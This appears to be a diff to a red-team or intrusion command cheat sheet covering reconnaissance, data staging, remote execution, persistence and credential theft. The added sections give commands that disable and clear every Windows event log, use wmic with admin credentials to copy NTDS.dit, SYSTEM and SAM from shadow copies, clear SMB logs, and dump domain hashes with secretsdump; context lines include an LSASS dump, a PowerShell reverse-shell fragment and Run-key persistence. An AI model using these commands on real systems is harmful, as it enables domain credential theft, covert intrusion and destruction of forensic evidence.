@@ -1,4 +1,4 @@
-# scan
+# Scan
 ```command
 ```
 
@@ -26,7 +26,7 @@ dsquery subnet
 dsquery server
 ```
 
-# information package
+# Information package
 ```command
 7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.*
 7z.exe x -padmin test.7z.001 -oc:\xl
@@ -38,14 +38,27 @@ makecab /d compressiontype=lzx C:\Users\lsass.txt C:\Users\lsass.cab >> C:\Users
 expand.exe lsass.cab -f:* .
 ```
 
-# log clear
+# Log clear
 ```command
+Linux
 wc -l ~/.bash_history
 sed -i '73,$d' ~/.bash_history
 tail -10f ~/.bash_history
+
+Windows
+///CMD:Enable or disable a log
+for /f "delims=" %a in ('WEVTUTIL EL') do WEVTUTIL SL "%a" /e:false
+
+///bat
+WEVTUTIL EL > .\LOGLIST.TXT
+for /f "delims=" %%a in ( .\LOGLIST.TXT ) do WEVTUTIL CL "%%a"
+del .\LOGLIST.TXT
+
+powershell.exe -command "wevtutil el | Foreach-Object {wevtutil cl "$_"}"
+powershell.exe -command "Get-WinEvent -ListLog * -Force | % {Wevtutil.exe cl $_.logname}"
 ```
 
-# remote execute
+# Remote execute
 ```command
 wmic /node:192.168.1.1 /user:administrator /password:"passwd" /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
 wmic /node:192.168.1.1 /user:administrator /password:"passwd" os get Caption,OSArchitecture,Version
@@ -60,9 +73,9 @@ python wmiexec.py test:passwdtest@10.10.1.1
 Psexec.exe \\10.10.1.1 -u test -p passwdtest cmd
 ```
 
-# powershell
+# Powershell
 ```command
-change file time
+copy file for time
 powershell.exe -command "Get-ChildItem -Path C:\ -Recurse –Include .txt,.doc,.xls,.pdf,.ppt,.docx,.xlsx,.pptf,.csv,.lnk | Where-Object { $.LastWriteTime -ge '02/01/2019 00:00:00' -AND $.LastWriteTime -le '10/27/2022 00:00:00'} | Copy-Item -Force -Destination C:\Users"
 
 write file
@@ -78,6 +91,7 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 # BypassAV
+
 <https://github.com/TideSec/BypassAntiVirus>
 
 <https://github.com/clinicallyinane/shellcode_launcher>
@@ -89,4 +103,24 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v test /t REG_SZ /d "rundll32.exe "C:\Users\test\test.dll" Test"
 reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "test" /f
+```
+
+# Domain hash
+```command
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" path win32_shadowcopy get id,InstallDate
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" path win32_shadowcopy where id="{ghgfhfgtyy7-BDD6-888-978E-ghj78686786}"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ 2>&1"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\ 2>&1"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\temp\ 2>&1"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "wevtutil cl Microsoft-Windows-SMBServer/Operational"
+wmic /node:10.1.1.10 /user:Domain\admin /password:"passwd123" process call create "wevtutil cl Microsoft-Windows-SMBClient/Connectivity"
+```
+
+# Hash crack
+```command
+python /root/Desktop/impacket-master/examples/secretsdump.py -ntds '/root/Desktop/ntds.dit' -system '/root/Desktop/SYSTEM' LOCAL >/root/Desktop/hash.txt &
+grep -E "4768" *.log |awk 'BEGIN{FS="Account Name:"} {print $2}'|awk 'BEGIN{FS="ffff:"} {print $1,$2}'|awk 'BEGIN{FS=" "} {printf $1 "\t" $22 "\n"}'>Decod.txt
+grep -E "4624" *.log|awk 'BEGIN{FS="Source Port:"} {print $1}'|awk 'BEGIN{FS="Account Name:"} {print $3 $4}'|awk 'BEGIN{FS=" "} {printf $1 "\t" $NF "\n"}' >>Decod.txt
+cat Decod.txt |sort| uniq -c | sort -nr > Decodhash.txt
 ```
